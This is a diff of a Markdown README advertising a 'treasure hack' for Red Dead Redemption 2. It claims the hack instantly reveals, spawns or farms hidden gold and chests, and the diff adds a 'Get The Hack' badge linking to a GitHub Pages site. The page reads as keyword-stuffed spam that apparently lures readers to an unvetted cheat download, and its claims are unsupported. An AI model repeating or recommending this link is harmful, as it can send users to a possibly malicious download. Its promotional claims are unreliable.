@@ -4,7 +4,7 @@
 
 One of the best thrills in Red Dead Redemption 2 is stumbling across **gold bars, hidden chests, and secret treasure maps**. But let’s be real – Rockstar hid them across a gigantic world, meaning you’ll spend hours searching. That’s where a **RDR 2 treasure hack** comes in. With hacks, you can instantly reveal, spawn, or farm every hidden stash and build your fortune without wasting time.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Hack-blueviolet)](https://rdr-2-treasure-hack.github.io/.github/)
 ---
 
 ## What Is a Treasure Hack in RDR 2?
